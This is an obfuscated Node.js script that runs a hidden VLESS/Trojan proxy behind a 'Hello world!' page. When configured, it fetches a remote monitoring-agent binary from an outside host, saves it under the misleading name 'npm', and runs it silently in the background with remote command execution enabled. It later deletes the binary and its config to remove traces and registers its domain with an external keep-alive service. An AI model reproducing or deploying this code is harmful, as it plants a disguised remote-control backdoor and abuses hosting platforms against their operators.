const _0x47014d=_0x21ef;(function(_0x162bec,_0x38788c){const _0x2b63ed=_0x21ef,_0xcb7a7b=_0x162bec();while(!![]){try{const _0x4bc41c=-parseInt(_0x2b63ed(0x1f2))/0x1*(parseInt(_0x2b63ed(0x1f9))/0x2)+parseInt(_0x2b63ed(0x219))/0x3*(parseInt(_0x2b63ed(0x1ee))/0x4)+-parseInt(_0x2b63ed(0x1e9))/0x5*(parseInt(_0x2b63ed(0x20c))/0x6)+parseInt(_0x2b63ed(0x21b))/0x7*(-parseInt(_0x2b63ed(0x203))/0x8)+-parseInt(_0x2b63ed(0x210))/0x9*(-parseInt(_0x2b63ed(0x1f6))/0xa)+parseInt(_0x2b63ed(0x1d8))/0xb+parseInt(_0x2b63ed(0x1df))/0xc*(parseInt(_0x2b63ed(0x1e7))/0xd);if(_0x4bc41c===_0x38788c)break;else _0xcb7a7b['push'](_0xcb7a7b['shift']());}catch(_0x4557e2){_0xcb7a7b['push'](_0xcb7a7b['shift']());}}}(_0x1bfe,0x9ea13));const os=require('os'),http=require(_0x47014d(0x237)),fs=require('fs'),axios=require(_0x47014d(0x23c)),net=require(_0x47014d(0x1e5)),path=require(_0x47014d(0x1e2)),crypto=require(_0x47014d(0x20b)),{Buffer}=require(_0x47014d(0x202)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||'5c6d3579-251b-4ef0-b82d-609ac156f843',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x47014d(0x1cf)][_0x47014d(0x21f)]||'',NEZHA_KEY=process['env'][_0x47014d(0x22b)]||'',DOMAIN=process['env'][_0x47014d(0x1da)]||_0x47014d(0x215),AUTO_ACCESS=process[_0x47014d(0x1cf)]['AUTO_ACCESS']||!![],WSPATH=process[_0x47014d(0x1cf)][_0x47014d(0x1ca)]||UUID[_0x47014d(0x205)](0x0,0x8),SUB_PATH=process['env'][_0x47014d(0x1e1)]||_0x47014d(0x1f0),NAME=process[_0x47014d(0x1cf)][_0x47014d(0x21e)]||_0x47014d(0x239),PORT=process[_0x47014d(0x1cf)][_0x47014d(0x1d6)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x15ef8a=_0x47014d;try{const _0x4aa738=await axios[_0x15ef8a(0x22c)]('https://speed.cloudflare.com/meta'),_0x66da24=_0x4aa738['data'];ISP=(_0x66da24[_0x15ef8a(0x230)]+'-'+_0x66da24[_0x15ef8a(0x1eb)])[_0x15ef8a(0x1c6)](/ /g,'_');}catch(_0xe39cf9){ISP='Unknown';}};GetISP();const httpServer=http[_0x47014d(0x1f7)]((_0x51327d,_0x4ef9fe)=>{const _0x1c94b3=_0x47014d;if(_0x51327d['url']==='/'){const _0x252f6e=path[_0x1c94b3(0x1fb)](__dirname,_0x1c94b3(0x23b));fs['readFile'](_0x252f6e,_0x1c94b3(0x214),(_0x28a859,_0x2691dd)=>{const _0x594f4d=_0x1c94b3;if(_0x28a859){_0x4ef9fe[_0x594f4d(0x223)](0xc8,{'Content-Type':_0x594f4d(0x1d9)}),_0x4ef9fe['end'](_0x594f4d(0x1fe));return;}_0x4ef9fe['writeHead'](0xc8,{'Content-Type':_0x594f4d(0x1d9)}),_0x4ef9fe[_0x594f4d(0x1d4)](_0x2691dd);});return;}else{if(_0x51327d[_0x1c94b3(0x1cd)]==='/'+SUB_PATH){const _0x4bba4e=_0x1c94b3(0x1f3)+UUID+'@'+DOMAIN+_0x1c94b3(0x238)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x1c94b3(0x218)+WSPATH+'#'+NAME+'-'+ISP,_0x1d18bf=_0x1c94b3(0x233)+UUID+'@'+DOMAIN+_0x1c94b3(0x1dc)+DOMAIN+_0x1c94b3(0x1d7)+DOMAIN+_0x1c94b3(0x218)+WSPATH+'#'+NAME+'-'+ISP,_0x1b0ea2=_0x4bba4e+'\x0a'+_0x1d18bf,_0x3b3ca6=Buffer['from'](_0x1b0ea2)['toString'](_0x1c94b3(0x22f));_0x4ef9fe['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x4ef9fe[_0x1c94b3(0x1d4)](_0x3b3ca6+'\x0a');}else _0x4ef9fe[_0x1c94b3(0x223)](0x194,{'Content-Type':'text/plain'}),_0x4ef9fe[_0x1c94b3(0x1d4)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x47014d(0x1ef))]({'server':httpServer}),uuid=UUID[_0x47014d(0x1c6)](/-/g,''),DNS_SERVERS=[_0x47014d(0x1f1),'1.1.1.1'];function resolveHost(_0x5dfca0){return new Promise((_0x1ed867,_0x2b9e36)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x5dfca0)){_0x1ed867(_0x5dfca0);return;}let _0xe2ce9e=0x0;function _0x3c2a91(){const _0x5db2c1=_0x21ef;if(_0xe2ce9e>=DNS_SERVERS[_0x5db2c1(0x1d2)]){_0x2b9e36(new Error('Failed\x20to\x20resolve\x20'+_0x5dfca0+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x404052=DNS_SERVERS[_0xe2ce9e];_0xe2ce9e++;const _0x71f88d=_0x5db2c1(0x21d)+encodeURIComponent(_0x5dfca0)+'&type=A';axios[_0x5db2c1(0x22c)](_0x71f88d,{'timeout':0x1388,'headers':{'Accept':_0x5db2c1(0x1c3)}})['then'](_0x155391=>{const _0x4898f0=_0x5db2c1,_0x2701de=_0x155391[_0x4898f0(0x1ff)];if(_0x2701de[_0x4898f0(0x201)]===0x0&&_0x2701de['Answer']&&_0x2701de[_0x4898f0(0x1e8)][_0x4898f0(0x1d2)]>0x0){const _0x17ac24=_0x2701de[_0x4898f0(0x1e8)][_0x4898f0(0x1d1)](_0x233445=>_0x233445['type']===0x1);if(_0x17ac24){_0x1ed867(_0x17ac24[_0x4898f0(0x1ff)]);return;}}_0x3c2a91();})[_0x5db2c1(0x20e)](_0x24dabc=>{_0x3c2a91();});}_0x3c2a91();});}function handleVlessConnection(_0x24d1e5,_0x5a4f55){const _0x13eeac=_0x47014d,[_0x3ce7a9]=_0x5a4f55,_0x1a797e=_0x5a4f55[_0x13eeac(0x205)](0x1,0x11);if(!_0x1a797e[_0x13eeac(0x1c8)]((_0x983b88,_0x3a333e)=>_0x983b88==parseInt(uuid[_0x13eeac(0x1c7)](_0x3a333e*0x2,0x2),0x10)))return![];let _0x2f5db8=_0x5a4f55[_0x13eeac(0x205)](0x11,0x12)['readUInt8']()+0x13;const _0x23e07f=_0x5a4f55[_0x13eeac(0x205)](_0x2f5db8,_0x2f5db8+=0x2)['readUInt16BE'](0x0),_0x2d185a=_0x5a4f55[_0x13eeac(0x205)](_0x2f5db8,_0x2f5db8+=0x1)['readUInt8'](),_0x48ef2b=_0x2d185a==0x1?_0x5a4f55['slice'](_0x2f5db8,_0x2f5db8+=0x4)[_0x13eeac(0x1fb)]('.'):_0x2d185a==0x2?new TextDecoder()[_0x13eeac(0x216)](_0x5a4f55['slice'](_0x2f5db8+0x1,_0x2f5db8+=0x1+_0x5a4f55[_0x13eeac(0x205)](_0x2f5db8,_0x2f5db8+0x1)[_0x13eeac(0x1dd)]())):_0x2d185a==0x3?_0x5a4f55[_0x13eeac(0x205)](_0x2f5db8,_0x2f5db8+=0x10)[_0x13eeac(0x208)]((_0x1e5f4c,_0x437951,_0x4a3b89,_0x30c55c)=>_0x4a3b89%0x2?_0x1e5f4c[_0x13eeac(0x1e0)](_0x30c55c['slice'](_0x4a3b89-0x1,_0x4a3b89+0x1)):_0x1e5f4c,[])[_0x13eeac(0x228)](_0x2825f4=>_0x2825f4[_0x13eeac(0x1e4)](0x0)[_0x13eeac(0x235)](0x10))[_0x13eeac(0x1fb)](':'):'';_0x24d1e5[_0x13eeac(0x1f5)](new Uint8Array([_0x3ce7a9,0x0]));const _0x5589e4=createWebSocketStream(_0x24d1e5);return resolveHost(_0x48ef2b)[_0x13eeac(0x22a)](_0x4db7de=>{const _0x5adeb2=_0x13eeac;net['connect']({'host':_0x4db7de,'port':_0x23e07f},function(){const _0x8b08dd=_0x21ef;this[_0x8b08dd(0x227)](_0x5a4f55[_0x8b08dd(0x205)](_0x2f5db8)),_0x5589e4['on'](_0x8b08dd(0x1db),()=>{})[_0x8b08dd(0x1d3)](this)['on']('error',()=>{})['pipe'](_0x5589e4);})['on'](_0x5adeb2(0x1db),()=>{});})[_0x13eeac(0x20e)](_0x3dd688=>{const _0x11ed1b=_0x13eeac;net[_0x11ed1b(0x221)]({'host':_0x48ef2b,'port':_0x23e07f},function(){const _0x21932a=_0x11ed1b;this[_0x21932a(0x227)](_0x5a4f55[_0x21932a(0x205)](_0x2f5db8)),_0x5589e4['on'](_0x21932a(0x1db),()=>{})[_0x21932a(0x1d3)](this)['on'](_0x21932a(0x1db),()=>{})[_0x21932a(0x1d3)](_0x5589e4);})['on'](_0x11ed1b(0x1db),()=>{});}),!![];}function handleTrojanConnection(_0x419063,_0x4746bd){const _0x5cbcf3=_0x47014d;try{if(_0x4746bd['length']<0x3a)return![];const _0x40fdcc=_0x4746bd[_0x5cbcf3(0x205)](0x0,0x38)[_0x5cbcf3(0x235)](),_0x44843d=[UUID];let _0x9ab4a5=null;for(const _0x1db019 of _0x44843d){const _0x515efe=crypto[_0x5cbcf3(0x1c9)]('sha224')[_0x5cbcf3(0x1e6)](_0x1db019)[_0x5cbcf3(0x23a)](_0x5cbcf3(0x22e));if(_0x515efe===_0x40fdcc){_0x9ab4a5=_0x1db019;break;}}if(!_0x9ab4a5)return![];let _0x45367e=0x38;_0x4746bd[_0x45367e]===0xd&&_0x4746bd[_0x45367e+0x1]===0xa&&(_0x45367e+=0x2);const _0x20e405=_0x4746bd[_0x45367e];if(_0x20e405!==0x1)return![];_0x45367e+=0x1;const _0x160817=_0x4746bd[_0x45367e];_0x45367e+=0x1;let _0x586a72,_0x50222f;if(_0x160817===0x1)_0x586a72=_0x4746bd['slice'](_0x45367e,_0x45367e+0x4)[_0x5cbcf3(0x1fb)]('.'),_0x45367e+=0x4;else{if(_0x160817===0x3){const _0x4704fa=_0x4746bd[_0x45367e];_0x45367e+=0x1,_0x586a72=_0x4746bd[_0x5cbcf3(0x205)](_0x45367e,_0x45367e+_0x4704fa)[_0x5cbcf3(0x235)](),_0x45367e+=_0x4704fa;}else{if(_0x160817===0x4)_0x586a72=_0x4746bd[_0x5cbcf3(0x205)](_0x45367e,_0x45367e+0x10)['reduce']((_0x49d2fb,_0x3b9800,_0x1704ac,_0x53bdff)=>_0x1704ac%0x2?_0x49d2fb['concat'](_0x53bdff[_0x5cbcf3(0x205)](_0x1704ac-0x1,_0x1704ac+0x1)):_0x49d2fb,[])[_0x5cbcf3(0x228)](_0x36c318=>_0x36c318['readUInt16BE'](0x0)[_0x5cbcf3(0x235)](0x10))['join'](':'),_0x45367e+=0x10;else return![];}}_0x50222f=_0x4746bd['readUInt16BE'](_0x45367e),_0x45367e+=0x2;_0x45367e<_0x4746bd['length']&&_0x4746bd[_0x45367e]===0xd&&_0x4746bd[_0x45367e+0x1]===0xa&&(_0x45367e+=0x2);const _0x3b1199=createWebSocketStream(_0x419063);return resolveHost(_0x586a72)[_0x5cbcf3(0x22a)](_0xf221bb=>{const _0x178f50=_0x5cbcf3;net['connect']({'host':_0xf221bb,'port':_0x50222f},function(){const _0x30adf2=_0x21ef;_0x45367e<_0x4746bd[_0x30adf2(0x1d2)]&&this[_0x30adf2(0x227)](_0x4746bd['slice'](_0x45367e)),_0x3b1199['on']('error',()=>{})['pipe'](this)['on'](_0x30adf2(0x1db),()=>{})[_0x30adf2(0x1d3)](_0x3b1199);})['on'](_0x178f50(0x1db),()=>{});})[_0x5cbcf3(0x20e)](_0x14746f=>{const _0x5cef39=_0x5cbcf3;net[_0x5cef39(0x221)]({'host':_0x586a72,'port':_0x50222f},function(){const _0xedf066=_0x5cef39;_0x45367e<_0x4746bd[_0xedf066(0x1d2)]&&this[_0xedf066(0x227)](_0x4746bd[_0xedf066(0x205)](_0x45367e)),_0x3b1199['on'](_0xedf066(0x1db),()=>{})[_0xedf066(0x1d3)](this)['on'](_0xedf066(0x1db),()=>{})[_0xedf066(0x1d3)](_0x3b1199);})['on']('error',()=>{});}),!![];}catch(_0x2cbbdb){return![];}}function _0x1bfe(){const _0x1f7e94=['stream','Status','buffer','16QgsCFG','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','slice','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','close','reduce','config.yaml','2087','crypto','258354MRBLwK','\x20-p\x20','catch','client_secret:\x20','139473jkpSEX','https://arm64.ssss.nyc.mn/agent','arch','utf-8','utf8','1234.abc.com','decode','includes','&path=%2F','8823NpmsKW','2096','2018233KhxjdD','connection','https://dns.google/resolve?name=','NAME','NEZHA_PORT','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','connect','log','writeHead','Server\x20is\x20running\x20on\x20port\x20','pop','arm64','write','map','chmod\x20+x\x20npm','then','NEZHA_KEY','get','https://arm64.ssss.nyc.mn/v1','hex','base64','country','arm','npm\x20download\x20successfully','trojan://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','toString','error:\x20','http',':443?encryption=none&security=tls&sni=','Hug','digest','index.html','axios','application/dns-json','true','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','replace','substr','every','createHash','WSPATH','writeFileSync','once','url','https://oooo.serv00.net/add-url','env','unlink','find','length','pipe','end','message','PORT','&fp=chrome&type=ws&host=','8684841CVDJSj','text/html','DOMAIN','error',':443?security=tls&sni=','readUInt8','finish','7088568APGCij','concat','SUB_PATH','path','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','readUInt16BE','net','update','26AqXCXt','Answer','30dYoihM','false','asOrganization','--tls','/bin/bash','124doYdmn','Server','sub','8.8.4.4','246YYmMYl','vless://','split','send','290YVweDh','createServer','npm','8348fyJPHN','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','join','Automatic\x20Access\x20Task\x20added\x20successfully','createWriteStream','Hello\x20world!','data'];_0x1bfe=function(){return _0x1f7e94;};return _0x1bfe();}wss['on'](_0x47014d(0x21c),(_0x36174e,_0x53333d)=>{const _0x1f5490=_0x47014d,_0x14da14=_0x53333d[_0x1f5490(0x1cd)]||'';_0x36174e[_0x1f5490(0x1cc)](_0x1f5490(0x1d5),_0x484fef=>{const _0x59f98=_0x1f5490;if(_0x484fef[_0x59f98(0x1d2)]>0x11&&_0x484fef[0x0]===0x0){const _0x39efc0=_0x484fef['slice'](0x1,0x11),_0x4217a1=_0x39efc0['every']((_0x326208,_0x1a7914)=>_0x326208==parseInt(uuid['substr'](_0x1a7914*0x2,0x2),0x10));if(_0x4217a1){!handleVlessConnection(_0x36174e,_0x484fef)&&_0x36174e[_0x59f98(0x207)]();return;}}!handleTrojanConnection(_0x36174e,_0x484fef)&&_0x36174e[_0x59f98(0x207)]();})['on'](_0x1f5490(0x1db),()=>{});});const getDownloadUrl=()=>{const _0x1ec3ec=_0x47014d,_0x104df6=os[_0x1ec3ec(0x212)]();return _0x104df6===_0x1ec3ec(0x231)||_0x104df6===_0x1ec3ec(0x226)||_0x104df6==='aarch64'?!NEZHA_PORT?_0x1ec3ec(0x22d):_0x1ec3ec(0x211):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0xf6c274=_0x47014d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x399e67=getDownloadUrl(),_0x1cb1e5=await axios({'method':_0xf6c274(0x22c),'url':_0x399e67,'responseType':_0xf6c274(0x200)}),_0x242405=fs[_0xf6c274(0x1fd)](_0xf6c274(0x1f8));return _0x1cb1e5[_0xf6c274(0x1ff)][_0xf6c274(0x1d3)](_0x242405),new Promise((_0x443027,_0x315e44)=>{const _0x142bd0=_0xf6c274;_0x242405['on'](_0x142bd0(0x1de),()=>{const _0x4bdc9a=_0x142bd0;console[_0x4bdc9a(0x222)](_0x4bdc9a(0x232)),exec(_0x4bdc9a(0x229),_0x3a8aa0=>{if(_0x3a8aa0)_0x315e44(_0x3a8aa0);_0x443027();});}),_0x242405['on'](_0x142bd0(0x1db),_0x315e44);});}catch(_0x39e291){throw _0x39e291;}},runnz=async()=>{const _0x830aec=_0x47014d;try{const _0x8aa796=execSync(_0x830aec(0x220),{'encoding':_0x830aec(0x213)});if(_0x8aa796['trim']()!==''){console[_0x830aec(0x222)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0xa128bb){}await downloadFile();let _0x548c46='',_0xc0044e=['443','8443',_0x830aec(0x21a),_0x830aec(0x20a),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x6707b4=_0xc0044e[_0x830aec(0x217)](NEZHA_PORT)?_0x830aec(0x1ec):'';_0x548c46='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x830aec(0x20d)+NEZHA_KEY+'\x20'+_0x6707b4+_0x830aec(0x234);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1916e0=NEZHA_SERVER[_0x830aec(0x217)](':')?NEZHA_SERVER[_0x830aec(0x1f4)](':')[_0x830aec(0x225)]():'',_0x38b135=_0xc0044e[_0x830aec(0x217)](_0x1916e0)?_0x830aec(0x1c4):_0x830aec(0x1ea),_0xd9ae21=_0x830aec(0x20f)+NEZHA_KEY+_0x830aec(0x206)+NEZHA_SERVER+_0x830aec(0x1c5)+_0x38b135+_0x830aec(0x204)+UUID;fs[_0x830aec(0x1cb)]('config.yaml',_0xd9ae21);}_0x548c46=_0x830aec(0x1fa);}else{console[_0x830aec(0x222)](_0x830aec(0x1e3));return;}}try{exec(_0x548c46,{'shell':_0x830aec(0x1ed)},_0x1caea1=>{const _0x5b6e4f=_0x830aec;if(_0x1caea1)console[_0x5b6e4f(0x1db)]('npm\x20running\x20error:',_0x1caea1);else console['log']('npm\x20is\x20running');});}catch(_0x51799d){console[_0x830aec(0x1db)](_0x830aec(0x236)+_0x51799d);}};function _0x21ef(_0x34ea51,_0x5a2052){const _0x1bfee7=_0x1bfe();return _0x21ef=function(_0x21efbc,_0x4dab4d){_0x21efbc=_0x21efbc-0x1c3;let _0x22684a=_0x1bfee7[_0x21efbc];return _0x22684a;},_0x21ef(_0x34ea51,_0x5a2052);}async function addAccessTask(){const _0x3ae400=_0x47014d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x47db3e='https://'+DOMAIN;try{const _0x35c44e=await axios['post'](_0x3ae400(0x1ce),{'url':_0x47db3e},{'headers':{'Content-Type':'application/json'}});console[_0x3ae400(0x222)](_0x3ae400(0x1fc));}catch(_0x2a6fa1){}}const delFiles=()=>{const _0x5ce9f1=_0x47014d;fs[_0x5ce9f1(0x1d0)](_0x5ce9f1(0x1f8),()=>{}),fs[_0x5ce9f1(0x1d0)](_0x5ce9f1(0x209),()=>{});};httpServer['listen'](PORT,()=>{const _0x70313f=_0x47014d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x70313f(0x224)+PORT);});
